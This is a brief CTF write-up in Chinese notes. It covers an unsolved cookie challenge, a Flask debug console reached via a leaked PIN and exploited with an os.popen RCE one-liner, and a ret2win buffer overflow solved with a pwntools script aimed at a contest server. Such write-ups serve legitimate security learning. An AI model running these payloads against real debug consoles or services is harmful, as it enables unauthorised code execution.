# web
### where-are-the-cookies
>[!description]
Tom is feeling especially snacky during the CTF, can you find where the cookies are?
Note: This challenge works best on Chrome

express+nginx1.25.1
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230805223931.png)
我tm哪知道cookies在哪

---


### debugzero
#flask
猜到了路由 `/console`,flask pin值在css文件里,直接可以进入
console rce
`__import__('os').popen('whoami').read();`
# reverse

# pwn
### Easy Peasy
vuln函数里有gets,一眼栈溢出
漏洞函数
```c
void __cdecl vuln()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  gets(buf);
}
```

```python
from pwn import *
#local
#sh = process("./ret2text")
#remote
sh=remote('3.110.66.92',32075)
win = 0x4017E53
sh.sendline(b'A'*40 + p64(win))
sh.recvline()         
```
感觉一点问题没有,,,

# crypto

# Misc


---
# *相关wp*




2023-08-05   21:05